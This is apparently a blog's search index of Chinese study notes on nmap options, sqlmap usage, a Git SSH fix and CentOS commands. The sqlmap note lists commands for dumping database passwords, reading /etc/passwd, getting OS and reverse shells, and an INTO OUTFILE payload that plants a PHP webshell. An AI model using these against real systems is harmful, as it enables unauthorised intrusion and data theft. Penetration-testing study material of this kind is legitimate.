<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Nmap常用参数]]></title>
    <url>%2F%2F2020%2F06%2F868037e0.html</url>
    <content type="text"><![CDATA[nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 扫描目标格式 示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL:从文件中加载目标 -iR:随机扫描 –exclude :排除网段或主机地址 –excledefile:排除文件中的地址 主机发现 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器 –system-dns:调用系统的DNS服务器 –traceroute：显示追踪到目标的路径 扫描技术 -sS/sT/sA/sW/sM:TCP扫描 S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 T是全连接扫描会和服务器建立完整的三次握手，效率低 A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 –scanflags ：实现上同上面几种类似，可以让用户自定义TCP标志位。 -sI : Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1. -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 端口相关参数 -p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports : 排除端口 -F：扫描比缺省少的端口（缺省1000，加了-F100） -r：顺序扫描端口，缺省是随机分组扫描 –top-ports :按top排序扫描知名端口 –port-ratio : 按比例扫描知名端口，值在0-1之间，越小扫的越多 系统/版本探测 -sV:探测开放的端口的系统/服务信息 –version-intensity :设置版本检测的详程度级别，0-9，越高越详细 –version-light：输出最可能的版本信息，缺省是2 –version-all：使用所有的探测条件进行版本/系统探测 –version-trace:打印详细的版本扫描过程 脚本扫描 –script=:指定脚本名称 –script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数 –script-help=: 查看脚本帮助信息 –script-updatedb:更新脚本数据库 系统探测 -O:激活系统探测 –osscan-limit:只对开放端口的有效主机进行系统探测 –osscan-guess：推测系统信息 其他 -T:时间模板，越大速度越快 -6：使能IPV6探测 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -V：打印版本号 -v：增加输出的详细程度]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap常用参数]]></title>
    <url>%2F%2F2020%2F06%2F519cc.html</url>
    <content type="text"><![CDATA[sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns #列出字段- –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容 –privileges #查看权限 –is-dba #是否是数据库管理员 –roles #枚举数据库用户角色 –udf-inject #导入用户自定义函数（获取系统权限） –union-check #是否支持union 注入 –union-cols #union 查询表记录 –union-test #union 语句测试 –union-use #采用union 注入 –union-tech orderby #union配合order by –method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″) –cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “” #使用referer欺骗(–referer “http://www.baidu.com”) –user-agent “” #自定义user-agent –proxy “http://127.0.0.1:8118″ #代理注入 –string “” #指定关键词 –threads #采用多线程(–threads 3) –sql-shell #执行指定sql命令 –sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ ) –file-read #读取指定文件 –file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) –file-dest #要写入的文件绝对路径 –os-cmd=id #执行系统命令 –os-shell #系统交互shell –os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) –msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/) –os-smbrelay # –os-bof # –reg-read #读取win系统注册表 –priv-esc # –time-sec= #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入 –eta #盲注 1. 基础用法 ./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中 2. sqlmap post注入 在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.2cto.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 如下图，这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3. sqlmap cookies注入 sqlmap.py -u “http://127.0.0.1/base.php&quot; –cookies “id=1” –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础 上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”-p是指指定参数注入 4. sqlmap遇到url重写的注入 哪里存在注入就加上 号./sqlmap.py -u “http://www.cunlide.com/id1/1/id2/2” 5. sqlmap 编码绕waf注入在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py” sqlmap读文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-read “/etc/passwd” sqlmap写文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2 sqlmap分段脱裤 sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000其他基础： sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 信息获取 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” - –union-check #是否支持union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart–proxy”http://127.0.0.1:8118&quot; #代理注入 sqlmap -u “http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 ./sqlmap.py -u “http://www.91ri.org/ id1/1*/id2/2″“Show.asp” –cookie “id=9” –table –level 2–forms–data “data”–delay 0.5–safe-freq 25-v 3 –dbs –batch –tamper “base64encode.py”sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump-all -v 传统的sql语句写shell通过sql注入select into outfile实现，如： 11&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;# dumpfile、file_put_contents outfile不能用了怎么办？select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;;可以 UDF提权https://www.cnblogs.com/milantgh/p/5444398.html outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。 写shell条件 文件名必须是绝对路径 用户必须有写文件权限 sqlmap写shell前提需要对目录具有写权限 1--os-cmd=&quot;net user&quot; 交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。 1--os-shell 写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell 关闭sqlmap文件就会被删除 常见数据库端口号123456789101112131415Oracle 默认1521SQL Server 默认1433Mysql默认330621 FTP22 ssh23 telnet25 smtp109 110 pop2 pop3]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo日志]]></title>
    <url>%2F%2F2019%2F06%2F1c91193.html</url>
    <content type="text"><![CDATA[2019.6.1Git 远程遇到了问题: Please make sure you have the correct access rights and the repository exists. 发现是ssh key有问题，连接不上服务器 首先是重新在git设置一下身份的名字和邮箱： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;your@email.com&quot; 注：要添加具体的yourname，your@email 删除.ssh文件夹（直接搜索该文件夹）下的known_hosts 在 git输入命令： $ ssh-keygen -t rsa -C &quot;your@email.com&quot; 然后会出现： Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制 登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key 在 git 中输入命令 ssh -T git@github.com 然后输入Yes回车，就会提示成功 之后就可以正常 hexo d -g 啦]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS]]></title>
    <url>%2F%2F2019%2F05%2F875db5e1.html</url>
    <content type="text"><![CDATA[CentOS 常用命令 shutdown -h now 关机 shutdown -h +3 三分钟后关机 halt poweroff init 0 shutdown -r now 重启 shutdown -r +3 三分钟重启 reboot init 6 cat 1.txt | tail - n +3001 | head -n 1000 截取文件中的3001到4000 grep o 1.txt 正常过滤 grep -v 1.txt 反向过滤 cat &gt;1.txt 清空文件内容 ll -d /data/www 查看权限 pkill -kill -t tty3 杀死用户进程 mkdir /media/cdrom mount /dev/sr0 /media/cdrom 挂载光盘 umount /media/cdrom 卸载 systemctl stop firewalld.service 关闭防火墙 setenforce 0 给外界权限 systemctl disable firewalld.service 永久关闭 systemctl enable firewalld.service 永久开启 vim /etc/rc.d/rc.local 设置开机启动为镜像添加开机自动挂载 echo &quot;mount /dev/sr0 /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local vim /etc/selinux/config ^vim^cat 把vim替换成cat继续执行 ls -al 看临时文件 CentOS7 目录文件 /etc/yum.repos.d/ yum源文件位置 /etc/rc.d/rc.local 开机启动文件 rm -f /var/run/yum.pid yum clean all 清空yum源缓存 /etc/nginx/conf.d/default.conf Nginx配置文件 vim /etc/my.cnf 去mysql密码要求 /usr/share/nginx/html/ Nginx主页文件位置 /etc/httpd/conf/httpd.conf Apache配置文件 /var/www/html/ Apache主页文件位置]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
